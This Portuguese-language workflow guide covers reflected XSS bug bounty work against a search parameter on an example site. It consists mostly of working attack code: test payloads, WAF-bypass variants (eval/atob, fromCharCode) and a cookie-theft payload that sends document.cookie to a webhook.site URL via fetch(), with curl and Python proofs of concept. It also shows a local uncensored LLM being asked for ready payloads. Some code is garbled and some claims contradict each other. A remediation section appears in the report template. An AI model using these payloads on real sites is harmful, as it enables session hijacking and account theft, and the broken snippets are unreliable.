# Workflow: XSS Reflected — Bug Bounty Completo

**Objetivo:** Encontrar, explorar e reportar XSS Reflected em formulário de busca.
**Tempo:** ~15 minutos
**Ferramentas:** X-ONE + curl + webhook.site

---

## Passo 1: Reconnaissance (2 minutos)

### 1.1 Usar X-ONE para estratégia inicial

```bash
curl -X POST http://localhost:7777/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "message": "Encontrei um formulário de busca em https://alvo.com/search?q=USER_INPUT. Como testar XSS refletido? Dá payloads prontos e técnicas de bypass se o site tiver WAF.",
    "model": "dolphin-llama3"
  }'
```

**X-ONE responde com:**
- 3-5 payloads XSS para testar primeiro
- Técnicas de bypass para WAFs comuns
- Ordem recomendada de teste
- Como validar se é realmente explorado

### 1.2 Criar webhook para exfiltração

Ir a https://webhook.site → copiar URL única
```
https://webhook.site/550e8400-e29b-41d4-a716-446655440000
```

---

## Passo 2: Testes Iniciais (5 minutos)

### 2.1 Teste básico (sem escaping)

```bash
PAYLOAD='<script>alert(1)</script>'
URL="https://alvo.com/search?q=$(urlencode "$PAYLOAD")"

curl -sk "$URL" | grep -i "script"
# Se aparecer o payload refletido → VULNERABLE
```

### 2.2 Se bloqueado, testar variações

```bash
# Case variation
PAYLOAD='<ScRiPt>alert(1)</ScRiPt>'
curl -sk "https://alvo.com/search?q=$(urlencode "$PAYLOAD")" | grep -i "script"

# Event handler
PAYLOAD='<img src=x onerror=alert(1)>'
curl -sk "https://alvo.com/search?q=$(urlencode "$PAYLOAD")" | grep -i "onerror"

# SVG
PAYLOAD='<svg/onload=alert(1)>'
curl -sk "https://alvo.com/search?q=$(urlencode "$PAYLOAD")" | grep -i "onload"
```

---

## Passo 3: PoC Funcional (3 minutos)

### 3.1 Cookie Theft Payload

```javascript
// Payload que roubacocookie do utilizador
<img src=x onerror="
  fetch('https://webhook.site/550e8400-e29b-41d4-a716-446655440000?cookie=' + btoa(document.cookie))
">
```

### 3.2 Teste com curl

```bash
WEBHOOK='https://webhook.site/550e8400-e29b-41d4-a716-446655440000'
PAYLOAD='<img src=x onerror="fetch('\'''"'"'$WEBHOOK'"'"'?c='\''+ document.cookie)">'

curl -sk "https://alvo.com/search?q=$(urlencode "$PAYLOAD")"
# Abrir browser na URL https://alvo.com/search?q=[PAYLOAD]
# Verificar webhook.site → deve receber cookies
```

### 3.3 Python PoC Completo

```python
import requests
import urllib.parse

target = "https://alvo.com/search"
webhook = "https://webhook.site/YOUR_ID"

payload = f'<img src=x onerror="fetch(\'{webhook}?c=\' + btoa(document.cookie))">'

params = {"q": payload}
url = target + "?" + urllib.parse.urlencode(params)

print(f"[+] Payload URL: {url}")
print(f"[+] Abrir no browser para testar")

# Verificar response
r = requests.get(url, verify=False)
print(f"[+] Status: {r.status_code}")
if payload in r.text:
    print("[SUCCESS] Payload refletido!")
else:
    print("[BLOCKED] Filtro detectado")
```

---

## Passo 4: Validação 100% (2 minutos)

### 4.1 Validação manual no browser

1. Abrir DevTools (F12)
2. Cola URL no browser
3. Vai para Console
4. Se `alert(1)` dispara → **CONFIRMED**
5. Ir a webhook.site e verificar se cookie foi recebido

### 4.2 Script Python de validação

```python
import requests
from selenium import webdriver
import time

target_url = "https://alvo.com/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"

# Abrir browser
driver = webdriver.Chrome()
driver.get(target_url)

# Esperar 2 segundos para JS executar
time.sleep(2)

# Verificar se alert foi chamado (pode ver no console)
try:
    alert = driver.switch_to.alert
    print("[CONFIRMED] Alert disparou!")
    alert.dismiss()
except:
    print("[UNCONFIRMED] Alert não apareceu")

driver.quit()
```

---

## Passo 5: Bypass de WAF (se necessário)

### 5.1 Detectar WAF

```bash
# Usar X-ONE para detectar
curl -X POST http://localhost:7777/api/chat \
  -d '{
    "message": "Teste básico: <script>alert(1)</script> foi bloqueado. Qual WAF é este? https://alvo.com"
  }'
```

### 5.2 Técnicas por WAF

**Se Cloudflare:**
```bash
# Payload 1: Case variation
<ScRiPt>alert(1)</ScRiPt>

# Payload 2: HTML entities
&#60;script&#62;alert(1)&#60;/script&#62;

# Payload 3: Unicode
<script>alert(1)</script>

# Taxa sucesso: 70-90%
```

**Se AWS WAF:**
```bash
# Hex encoding
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

# Base64 + eval
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

# Taxa sucesso: 80-95%
```

---

## Passo 6: CVSS Score

### 6.1 Usar X-ONE para calcular

```bash
curl -X POST http://localhost:7777/api/chat \
  -d '{
    "message": "Calculá CVSS v3.1 para: XSS Reflected em formulário público (sem auth), não requer interação com vítima, rouba cookies. Score + vector!"
  }'
```

**X-ONE responde:**
- CVSS Score: 7.1 (High)
- Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
- Justificação componente por componente

---

## Passo 7: Report Profissional

### 7.1 Template estruturado

```markdown
# Relatório de Bug Bounty — XSS Reflected

## Resumo
- **Tipo:** Cross-Site Scripting (XSS) Reflected
- **Severidade:** High
- **CVSS:** 7.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
- **Status:** Confirmado

## URL Afetada
```
https://alvo.com/search?q=USER_INPUT
```

## Parâmetro Vulnerável
`q` (query string)

## Descrição
O parâmetro `q` da página de busca reflete entrada do utilizador sem sanitização. Um atacante pode injetar código JavaScript que será executado no contexto do browser da vítima, permitindo roubo de cookies de sessão e credenciais.

## Passos de Reprodução

1. Navegar para: `https://alvo.com/search`
2. Colar no campo de busca: `<img src=x onerror=alert(1)>`
3. Clicar em "Buscar"
4. **Resultado esperado:** Pop-up com número "1" aparece
5. Abrir DevTools (F12) → Console → ver a execução

## Prova (PoC)

### Curl
```bash
curl -sk 'https://alvo.com/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E'
```

### Python
```python
import requests
r = requests.get('https://alvo.com/search?q=<img src=x onerror=alert(1)>')
if '<img src=x onerror=alert(1)>' in r.text:
    print("[XSS CONFIRMED]")
```

## Impacto
- Roubo de cookies de autenticação
- Sequestro de sessão (hijacking)
- Redirecionamento para site malicioso
- Injeção de malware
- Roubo de dados sensíveis

## Impacto Real
Um atacante pode:
1. Compartilhar URL malicioso no Twitter/Reddit
2. Vítima clica → seu cookie é roubado
3. Atacante usa cookie para acessar a conta da vítima
4. **Resultado:** Acesso não autorizado à conta

## Remediação Recomendada

### Curto Prazo (Imediato)
Implementar Content-Security-Policy (CSP):
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; object-src 'none';">
```

### Longo Prazo
1. Sanitizar entrada com biblioteca segura (DOMPurify, etc)
2. Usar output encoding (HTML entities)
3. Implementar WAF (Cloudflare, AWS WAF)
4. Treinar desenvolvedores sobre XSS

### Código Corrigido
```php
// ANTES (Vulnerável)
echo "Resultados para: " . $_GET['q'];

// DEPOIS (Seguro)
echo "Resultados para: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

## Referências
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
```

### 7.2 Submeter via X-ONE

```bash
curl -X POST http://localhost:7777/api/findings \
  -H "Content-Type: application/json" \
  -d '{
    "vuln_type": "XSS Reflected",
    "url": "https://alvo.com/search?q=",
    "payload": "<img src=x onerror=\"alert(1)\">",
    "severity": "High",
    "param": "q",
    "context": "User input refletido sem sanitização no body HTML",
    "evidence": "screenshot.png",
    "tool": "manual_testing",
    "cvss_score": 7.1,
    "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
  }'
```

---

## Checklist Final

- [x] Payload básico funciona (`<script>alert(1)</script>`)
- [x] Validado no browser (alert dispara)
- [x] PoC Python completo criado
- [x] Cookie theft testado (webhook.site)
- [x] Técnicas de bypass documentadas
- [x] CVSS score calculado
- [x] Report profissional criado
- [x] Referências incluídas

---

## Tempo Total: ~15-20 minutos
Inclui: Reconnaissance, Exploitation, Validation, Report
